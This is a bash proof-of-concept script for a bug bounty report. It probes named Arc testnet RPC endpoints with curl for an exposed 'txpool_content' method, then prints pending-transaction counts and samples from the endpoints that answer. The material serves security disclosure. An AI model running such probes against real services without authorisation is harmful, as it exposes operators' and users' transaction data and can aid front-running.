#!/bin/bash
# ==============================================
# Circle BBP - Mempool Transaction Exposure
# Live PoC Script
# ==============================================
# Run: bash /home/agia/circle-bbp-poc.sh
# ==============================================

set -e

echo "=========================================="
echo "  Circle BBP Bug Bounty"
echo "  Finding: Mempool Transaction Exposure"
echo "=========================================="
echo ""
echo "Asset: rpc.blockdaemon.testnet.arc.network"
echo "      rpc.drpc.testnet.arc.network"
echo "Severity: Medium"
echo ""

# Test 1: Blockdaemon RPC
echo "[1/4] Testing rpc.blockdaemon.testnet.arc.network..."
BLOCKDAEMON=$(curl -sL --max-time 10 -X POST "https://rpc.blockdaemon.testnet.arc.network" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"txpool_content","params":[],"id":1}' 2>/dev/null)

if echo "$BLOCKDAEMON" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('result',{}).get('pending',{}))" >/dev/null 2>&1; then
  PENDING=$(echo "$BLOCKDAEMON" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d['result']['pending']))")
  QUEUED=$(echo "$BLOCKDAEMON" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d['result']['queued']))")
  echo "  ✓ VULNERABLE"
  echo "    - Pending transactions exposed: $PENDING"
  echo "    - Queued transactions exposed: $QUEUED"
  
  # Extract sample
  echo ""
  echo "  Sample transactions:"
  echo "$BLOCKDAEMON" | python3 -c "
import sys,json
d=json.load(sys.stdin)
for sender, nonces in list(d['result']['pending'].items())[:2]:
    for nonce, tx in list(nonces.items())[:1]:
        print(f\"    From: {tx['from']}\")
        print(f\"    To:   {tx.get('to', 'CONTRACT_CREATION')}\")
        print(f\"    Value: {int(tx['value'], 16) / 1e18:.4f} ARC\")
        print(f\"    Nonce: {int(tx['nonce'], 16)}\")
        print()
"
else
  echo "  ✗ PROTECTED"
fi

# Test 2: DRPC RPC
echo "[2/4] Testing rpc.drpc.testnet.arc.network..."
DRPC=$(curl -sL --max-time 10 -X POST "https://rpc.drpc.testnet.arc.network" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"txpool_content","params":[],"id":1}' 2>/dev/null)

if echo "$DRPC" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('result',{}).get('pending',{}))" >/dev/null 2>&1; then
  PENDING=$(echo "$DRPC" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d['result']['pending']))")
  QUEUED=$(echo "$DRPC" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d['result']['queued']))")
  echo "  ✓ VULNERABLE"
  echo "    - Pending transactions exposed: $PENDING"
  echo "    - Queued transactions exposed: $QUEUED"
else
  echo "  ✗ PROTECTED"
fi

# Test 3: Official RPC (should be protected)
echo ""
echo "[3/4] Verifying rpc.testnet.arc.network is protected..."
OFFICIAL=$(curl -sL --max-time 10 -X POST "https://rpc.testnet.arc.network" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"txpool_content","params":[],"id":1}' 2>/dev/null)

if echo "$OFFICIAL" | grep -q "not supported"; then
  echo "  ✓ CORRECTLY PROTECTED"
else
  echo "  ✗ UNEXPECTEDLY EXPOSED"
fi

# Test 4: QuickNode (should be protected)
echo ""
echo "[4/4] Verifying rpc.quicknode.testnet.arc.network is protected..."
QUICKNODE=$(curl -sL --max-time 10 -X POST "https://rpc.quicknode.testnet.arc.network" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"txpool_content","params":[],"id":1}' 2>/dev/null)

if echo "$QUICKNODE" | grep -q "not supported"; then
  echo "  ✓ CORRECTLY PROTECTED"
else
  echo "  ✗ UNEXPECTEDLY EXPOSED"
fi

echo ""
echo "=========================================="
echo "  PoC Complete"
echo "=========================================="